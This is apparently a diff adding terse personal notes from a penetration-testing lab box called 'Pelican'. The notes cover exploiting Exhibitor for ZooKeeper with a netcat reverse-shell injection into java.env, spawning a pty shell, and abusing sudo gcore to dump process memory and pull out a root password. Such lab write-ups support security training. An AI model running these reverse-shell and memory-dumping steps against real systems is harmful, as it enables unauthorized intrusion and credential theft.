@@ -1,0 +1,46 @@
+192.168.221.98  Pelican
+
+
+192.168.221.98:8081
+Got 
+Exhibitor for ZooKeeper v1.0
+searched on google 
+
+https://www.exploit-db.com/exploits/48654
+
+
+listen on kali nc -nvlp 4545
+Config tab
+Make followint entry in java.env script them commit >all at once 
+$(/bin/nc -e /bin/sh 192.168.45.173 4545 &)
+got shell
+/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+sudo -l
+and its sudo with gcore
+
+I found sudo gcore $PID
+I need to find good PID
+https://www.passwordstore.org/
+
+sudo /usr/bin/gcore 513 
+cat core.513
+looks like different I need to read strings 
+so use
+strings core.513
+
+Got username and passowrd root
+
+001 Password: root:
+ClogKingpinInning731
+
+su root
+
+I am root now
+
+
+
+sudo gcore -o pass 513
+strings pass.513
+
+
